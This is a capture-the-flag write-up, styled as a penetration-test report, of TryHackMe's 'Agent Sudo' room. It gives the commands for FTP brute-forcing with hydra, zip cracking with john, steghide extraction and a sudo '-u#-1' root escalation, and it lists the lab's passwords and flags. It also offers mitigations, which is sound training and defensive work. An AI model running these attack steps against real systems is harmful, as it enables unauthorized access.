# **Vulnerability Assessment and Penetration Testing (VAPT) Report – Agent Sudo**  
**Prepared by:** Nishanth Antony  
**Date:** August 21, 2025  
**Difficulty:** Easy  
**Category:** Web Exploitation / Steganography / Privilege Escalation  
**Platform:** TryHackMe (THM)  

---

### 1. Reconnaissance Steps  
**Objective:** Identify active hosts, open ports, services, and vulnerabilities.  
**Commands Used:**  
- `ping <target_ip>`  
- `nmap -p- --min-rate=1000 -sV <target_ip> -T4 -v`  
- `hydra -l chris -P /usr/share/wordlists/rockyou.txt <target_ip> ftp`  

**Findings:**  
- Host confirmed online via ping.  
- Open ports: FTP (21, vsftpd 3.0.3), SSH (22, OpenSSH 7.6p1), HTTP (80, Apache 2.4.29).  
- Webpage `/agent_C_attention.php` hinted at user chris with a weak password.  
- FTP enumeration revealed files: To_agentJ.txt, cute-alien.jpg, cutie.png.  

---

### 2. Exploitation Process  
**Step 1 – Web Enumeration (Port 80)**  
- Accessed `/agent_C_attention.php`: Revealed user chris with a weak password and mention of agent J.  

**Step 2 – FTP Brute-Force (Port 21)**  
- Brute-forced chris’s FTP credentials:
```bash
  hydra -l chris -P /usr/share/wordlists/rockyou.txt <target_ip> ftp
``` 
- Result: Password `crystal`.  

**Step 3 – FTP Access and File Retrieval**  
- Logged into FTP with chris:crystal:
  ```bash 
  ftp chris@<target_ip>
  ```
- Downloaded files: To_agentJ.txt, cute-alien.jpg, cutie.png.  

**Step 4 – Steganography Analysis**  
- Analyzed cutie.png with binwalk:
  ```bash
  binwalk -e cutie.png
  ```
- Found encrypted zip (8702.zip) containing To_agentR.txt.  
- Cracked zip password with john:
  ```bash
  zip2john 8702.zip > zip.hash  
  john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
  ```
- Result: Password `alien`.  
- Extracted To_agentR.txt: Revealed encoded username QXJlYTUx (base64: Area51).  
- Extracted hidden message from cute-alien.jpg using steghide:
  ```bash
  `steghide extract -sf cute-alien.jpg -p alien`
  ```
- Result: message.txt with james’s password `hackerrules!`.  

**Step 5 – SSH Access as James**  
- Logged in via SSH:  
  `ssh james@<target_ip>` with password `hackerrules!`.  
- Found user_flag.txt and Alien_autospy.jpg in /home/james.  
- user_flag.txt: `b03d975e8c92a7c04146cfa7a5a313c7`.  

**Step 6 – Privilege Escalation**  
- Checked sudo permissions:
  ```bash
  sudo -l
  ```
- Found james could run `/bin/bash` as any user except root.  
- Exploited sudo misconfiguration:
  ```bash 
  sudo -u#-1 /bin/bash
  ```
- Gained root shell and accessed /root/root.txt:  
  `b53a02f55b57d4439e3341834d70c062`.  

---

### 3. Proof of Concept (PoC)  
- **FTP Brute Force:**
  ```bash
  hydra -l chris -P /usr/share/wordlists/rockyou.txt <target_ip> ftp
  ``` 
  Obtained chris:crystal.  
- **Zip Password Cracking:**
  ```bash
  john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
  ```
  Cracked password alien.  
- **Steganography Extraction:**
  ```bash
  steghide extract -sf cute-alien.jpg -p alien
  ``` 
  Obtained james:hackerrules!.  
- **Privilege Escalation:**
  ```bash
  sudo -u#-1 /bin/bash
  ```
  Gained root access to root.txt.  

---

### 4. Privilege Escalation  
- Exploited sudo misconfiguration allowing james to run `/bin/bash` as any user except root.  
- Used `-u#-1` to bypass restriction and gain root shell.  

---

### 5. Mitigation Recommendations  
- **Web Server Hardening:**  
  - Remove sensitive files like `/agent_C_attention.php`.  
  - Restrict web directory access with authentication.  
- **Authentication Security:**  
  - Enforce strong passwords for FTP and SSH.  
  - Implement multi-factor authentication.  
- **File Security:**  
  - Avoid storing sensitive data in publicly accessible FTP directories.  
  - Use strong encryption for hidden data in images.  
- **Sudo Configuration:**  
  - Restrict sudo commands to specific, necessary actions.  
  - Prevent wildcard user specifications (e.g., ALL, !root).  
- **Patch Management:**  
  - Update vsftpd, OpenSSH, and Apache to the latest versions.  
  - Monitor logs for unauthorized access attempts.  

---

### 6. Lessons Learned  
- **Weak Credentials:** Easily brute-forced passwords (e.g., crystal) enable initial access.  
- **Steganography Exposure:** Hidden data in images can leak credentials if poorly protected.  
- **Sudo Misconfiguration:** Overly permissive sudo rules allow privilege escalation.  
- **File Security:** Publicly accessible files on FTP servers are vulnerable to exploitation.  

---

### 7. Skills Practiced  
- Network scanning (`nmap`, `ping`)  
- Credential brute-forcing (`hydra`)  
- FTP enumeration and file retrieval  
- Steganography analysis (`steghide`, `binwalk`)  
- Password cracking (`john`, `zip2john`)  
- SSH access and privilege escalation  
- Secure reporting and mitigation strategies
